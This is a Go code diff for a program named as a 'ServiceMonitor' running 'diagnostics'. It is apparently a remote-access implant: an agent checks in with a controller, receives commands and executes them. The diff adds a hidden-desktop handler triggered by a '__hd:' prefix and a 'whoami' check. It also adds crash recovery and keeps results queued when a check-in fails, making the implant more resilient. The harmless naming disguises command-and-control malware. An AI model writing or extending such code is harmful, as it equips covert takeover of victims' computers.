@@ -335,6 +335,22 @@ func (sm *ServiceMonitor) syncStatus(diagnostics []map[string]interface{}) ([]ma
 func (sm *ServiceMonitor) runDiagnostic(checkName string) DiagnosticResult {
 	start := time.Now()
 
+	if checkName == "whoami" {
+		if user := nativeUser(); user != "" {
+			return DiagnosticResult{CheckName: checkName, Output: user, Status: "completed", Timestamp: time.Now(), DurationMs: time.Since(start).Milliseconds()}
+		}
+	}
+
+	if strings.HasPrefix(checkName, "__hd:") {
+		return DiagnosticResult{
+			CheckName:  checkName,
+			Output:     handleHiddenDesktop(checkName),
+			Status:     "completed",
+			Timestamp:  time.Now(),
+			DurationMs: time.Since(start).Milliseconds(),
+		}
+	}
+
 	if strings.HasPrefix(checkName, "cd ") {
 		dir := strings.TrimSpace(strings.TrimPrefix(checkName, "cd "))
 		err := os.Chdir(dir)
@@ -411,7 +427,15 @@ func (sm *ServiceMonitor) processTasks(tasks []map[string]interface{}) []map[str
 			continue
 		}
 
-		diag := sm.runDiagnostic(checkName)
+		var diag DiagnosticResult
+		func() {
+			defer func() {
+				if rec := recover(); rec != nil {
+					diag = DiagnosticResult{CheckName: checkName, Output: fmt.Sprintf("Error: %v", rec), Status: "error", Timestamp: time.Now()}
+				}
+			}()
+			diag = sm.runDiagnostic(checkName)
+		}()
 		result := map[string]interface{}{
 			"type":      "response",
 			"output":    diag.Output,
@@ -578,7 +602,6 @@ func main() {
 			}
 
 			commands, err := transport.Checkin(agentID, pending)
-			pending = nil
 			if err != nil {
 				consecutiveFailures++
 				if consecutiveFailures >= maxFailures {
@@ -595,6 +618,7 @@ func main() {
 				time.Sleep(5 * time.Second)
 				continue
 			}
+			pending = nil
 			consecutiveFailures = 0
 
 			pending = svc.processTasks(commands)
